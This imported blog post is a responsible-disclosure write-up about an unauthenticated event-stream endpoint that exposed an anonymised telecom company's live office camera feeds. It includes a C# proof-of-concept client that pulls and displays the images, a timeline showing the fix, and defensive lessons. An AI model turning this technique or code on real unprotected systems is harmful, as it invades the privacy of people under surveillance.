---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-11-14_tapping-into-a-telecommunications-companys-office-cameras.md
original_filename: 2023-11-14_tapping-into-a-telecommunications-companys-office-cameras.md
title: Tapping into a telecommunications company’s office cameras
category: documents
detected_topics:
- sso
- command-injection
- otp
- api-security
tags:
- imported
- documents
- sso
- command-injection
- otp
- api-security
language: en
raw_sha256: a0961018e21dabefb0f308e1ad1ff01fd984344d572f40257c5ab914fbfd0d4a
text_sha256: ef8c76a4b72130c51d4aac246069e0afa870b088dea23dcfc06e6de611c9246b
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: false
---

# Tapping into a telecommunications company’s office cameras

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-11-14_tapping-into-a-telecommunications-companys-office-cameras.md
- Source Type: markdown
- Detected Topics: sso, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: False
- Raw SHA256: `a0961018e21dabefb0f308e1ad1ff01fd984344d572f40257c5ab914fbfd0d4a`
- Text SHA256: `ef8c76a4b72130c51d4aac246069e0afa870b088dea23dcfc06e6de611c9246b`


## Content

---
title: "Tapping into a telecommunications company’s office cameras"
url: "https://eaton-works.com/2023/11/14/telecom-camera-hack/"
final_url: "https://eaton-works.com/2023/11/14/telecom-camera-hack/"
authors: ["Eaton Z. (@XeEaton)"]
bugs: ["Missing authentication", "Privacy issue"]
publication_date: "2023-11-14"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 676
---

# Tapping into a telecommunications company’s office cameras

![](/assets/images/ew-logo-4circle-48.png?cb=64e21a35) Eaton • Nov 14, 2023

Copy Link Share 

I have a fun little API flaw worth talking about today. An unauthenticated API endpoint in a major telecommunications company’s office camera system allowed me to tap into the image stream and view the live camera feeds. The company in question is a multi-billion dollar telecommunications company and they explicitly requested anonymity if I were to publish any details regarding the exploit.

## **The Camera Platform**

The company maintains a custom-built platform/website that certain employees use to manage the camera system. It lets them manage the cameras, download noteworthy “incident” videos, and view the live feeds. It is a [React](https://react.dev/)-based platform that interacts with a server using APIs. The website is publicly accessible, but all functionality is locked behind a corporate login page.

## **The Flaw**

Being a React website, it was easy to uncover all the APIs. To protect the identity of the company, details of the actual website code will not be shown, but the website uses [source maps](https://web.dev/articles/source-maps) which made it very easy to reverse engineer the site and find all the API endpoints. For the most part, the website was properly secured. Almost all API endpoints required a valid authentication token, and I couldn’t find any way around that. I say almost because there was one endpoint that was _not_ secure: the live feeds. It was an [event stream](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events) that endlessly provided data in a JSON format. You can open it in your browser and be served an infinite loading page:

![](https://eaton-works.com/cdn-cgi/imagedelivery/VwwCqBIYNXeyNQwEQ8uyVQ/a72daa3e-de74-4d98-50c4-de0bf3de5900/full)

I decided to make a quick desktop application to tap into this image stream:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters. [Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[ Show hidden characters ]({{ revealButtonHref }})

| //https://eaton-works.com/2023/11/14/telecom-camera-hack/  
---|---  
|  
| using ServiceStack.Text;  
|  
| namespace CameraStreamApp;  
|  
| public sealed partial class MainForm : Form  
| {  
|  private readonly Dictionary<string, PictureBox> cameras = new();  
|  
|  public MainForm() => InitializeComponent();  
|  
|  private sealed class CameraUpdate  
|  {  
|  public string ip { get; set; }  
|  
|  public string image_name { get; set; }  
|  
|  public string raw_image { get; set; }  
|  
|  public string camera_no { get; set; }  
|  }  
|  
|  private async void MainForm_Shown(object sender, EventArgs e)  
|  {  
|  var client = new HttpClient();  
|  
|  using (var streamReader = new StreamReader(await client.GetStreamAsync("[https://a-telecom-company.com/api/events/incident-events&quot](https://a-telecom-company.com/api/events/incident-events&quot);)))  
|  {  
|  while (true)  
|  {  
|  //Each stream line contains a new live image.  
|  var message = await streamReader.ReadLineAsync();  
|  if (string.IsNullOrEmpty(message)) continue;  
|  //Clean up the JSON a bit and then deserialize.  
|  var cu = JsonSerializer.DeserializeFromString<CameraUpdate>(message[7..^1].Replace("\\\\\"", "\"").Replace("\\\n", string.Empty));  
|  if (cameras.TryGetValue(cu.camera_no, out var camera))  
|  {  
|  //An existing camera has been found. Update the picture box in the UI with the latest live image.  
|  if (string.IsNullOrEmpty(cu.raw_image)) continue;  
|  using (var ms = new MemoryStream(Convert.FromBase64String(cu.raw_image)))  
|  {  
|  camera.Image = Image.FromStream(ms);  
|  }  
|  }  
|  else  
|  {  
|  //A new camera has been found. Add a picture box in the UI for it.  
|  var pb = new PictureBox { Width = 400, Height = 300, Padding = new Padding(10), Dock = DockStyle.Top };  
|  cameras.Add(cu.camera_no, pb);  
|  CamerasPanel.Controls.Add(pb);  
|  Text = $"A Telecom Company Video ({cameras.Count} Cameras)";  
|  if (string.IsNullOrEmpty(cu.raw_image)) continue;  
|  using (var ms = new MemoryStream(Convert.FromBase64String(cu.raw_image)))  
|  {  
|  pb.Image = Image.FromStream(ms);  
|  }  
|  }  
|  }  
|  }  
|  }  
| }  
  
[view raw](https://gist.github.com/EatonZ/ecc3aad552950194eeae92b903d19743/raw/76defe5c5930bd0413bbfb63a9be1eb3184620d6/MainForm.cs) [ MainForm.cs ](https://gist.github.com/EatonZ/ecc3aad552950194eeae92b903d19743#file-mainform-cs) hosted with ❤ by [GitHub](https://github.com)

Here is the end result. I took screenshots of the day and night stream:

![](https://eaton-works.com/cdn-cgi/imagedelivery/VwwCqBIYNXeyNQwEQ8uyVQ/442a4c47-e60e-4c6c-87b1-4a7c3dd3d900/full)

![](https://eaton-works.com/cdn-cgi/imagedelivery/VwwCqBIYNXeyNQwEQ8uyVQ/caaf6284-e807-4e95-4e38-45fc686d0400/full)

The cameras were labeled “office”, but it looked more like a warehouse. I was unable to pinpoint exactly where these cameras are located. I also checked in on various days and while I never saw any people, I did notice various items change location, meaning people were definitely working in the area at some point.

## **Impact**

This was a read-only vulnerability because you could only access the image stream and all other functions required valid authentication. The impact is therefore not critical in severity, but it was definitely an invasion of privacy that needed to be addressed.

## **Reporting Timeline**

  * **August 7, 2023:** Reported
  * **August 8, 2023:** They request more information/proof of concept. I send it along with the desktop application I made.
  * **August 9, 2023:** They open an incident.
  * **August 23, 2023:** I noticed that authentication has been added to the exposed API. The issue is now fixed (authentication token check was added) and I ask for an update and if they have a bug bounty.
  * **September 1, 2023:** Official confirmation received that the issue is fixed. Still awaiting answer to above question.
  * **September 18, 2023:** I ask for an update.
  * **October 13, 2023:** Official confirmation received that no bug bounty is in place, and the company name should not be attached to any disclosure/report.

## **Lessons / Takeaways**

The primary lesson to learn from this is: keep track of all your API endpoints and don’t miss any when configuring authentication. While the web page on which the live feed could be reviewed was protected behind a login, the underlying API was unprotected. Always assume your API endpoints are discoverable and protect accordingly!
